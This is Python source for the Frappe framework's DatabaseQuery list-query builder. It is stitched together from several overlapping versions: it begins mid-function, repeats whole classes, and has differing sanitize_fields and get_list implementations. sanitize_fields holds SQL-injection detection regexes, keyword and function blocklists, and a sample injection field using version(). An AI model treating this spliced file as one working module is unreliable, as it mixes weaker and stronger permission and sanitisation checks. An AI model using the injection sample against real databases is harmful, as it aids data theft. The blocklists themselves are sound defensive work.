						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	kwargs.pop('ignore_permissions', None)
	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.client import check_parent_permission
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''

		sub_query_regex = re.compile("^.*[,();].*")
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Use of sub-query or function is restricted'), frappe.DataError)

		def _is_query(field):
			if re.compile("^(select|delete|update|drop|create)\s").match(field):
				_raise_exception()

			elif re.compile("\s*[a-zA-z]*\s*( from | group by | order by | where | join )").match(field):                    
				_raise_exception()

		for field in self.fields:
			if sub_query_regex.match(field):
				if any(keyword in field.lower().split() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("({0}".format(keyword) in field.lower() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() for keyword in blacklisted_functions):
					_raise_exception()

			if re.compile("[a-zA-Z]+\s*'").match(field):                    
				_raise_exception()

			if re.compile('[a-zA-Z]+\s*,').match(field):                    
				_raise_exception()

			_is_query(field)


	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	kwargs.pop('ignore_permissions', None)

	# If doctype is child table
	if frappe.is_table(doctype):
		# Example frappe.db.get_list('Purchase Receipt Item', {'parent': 'Purchase Receipt'})
		# Here purchase receipt is the parent doctype of the child doctype Purchase Receipt Item

		if not kwargs.get('parent'):
			frappe.flags.error_message = _('Parent is required to get child table data')
			raise frappe.PermissionError(doctype)

		check_parent_permission(kwargs.get('parent'), doctype)
		del kwargs['parent']

	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				 ' or '.join(self.or_conditions)                    

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''
		regex = re.compile('^.*[,();].*')                    
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Cannot use sub-query or function in fields'), frappe.DataError)

		for field in self.fields:
			if regex.match(field):                    
				if any(keyword in field.lower() for keyword in blacklisted_keywords):                    
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() \                    
					for keyword in blacklisted_functions):                    
					_raise_exception()

	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

